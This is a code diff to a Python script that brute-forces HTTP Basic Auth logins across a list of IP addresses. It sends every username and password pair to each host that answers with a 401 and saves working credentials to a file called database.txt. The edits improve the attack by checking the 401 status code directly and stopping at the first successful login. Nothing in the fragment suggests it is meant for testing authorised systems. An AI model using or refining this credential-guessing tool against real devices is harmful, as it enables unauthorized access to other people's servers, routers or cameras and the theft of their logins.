@@ -9,7 +9,7 @@ for ip in ips:
     print(ip)
     try:
         response = requests.get('http://' + str(ip), timeout=5.0)
-        if response.reason == 'Unauthorized':
+        if response.status_code == 401:
             for u in user:
                 for p in password:
                     response = requests.get('http://'+str(ip), auth=HTTPBasicAuth(u, p))
@@ -17,6 +17,7 @@ for ip in ips:
                         f = open('database.txt','a+')
                         f.write('IP: {} User: {} Password: {}\n'.format(ip,u,p))
                         f.close()
+                        break
     except requests.exceptions.ConnectionError:
         continue
     except requests.exceptions.ReadTimeout:
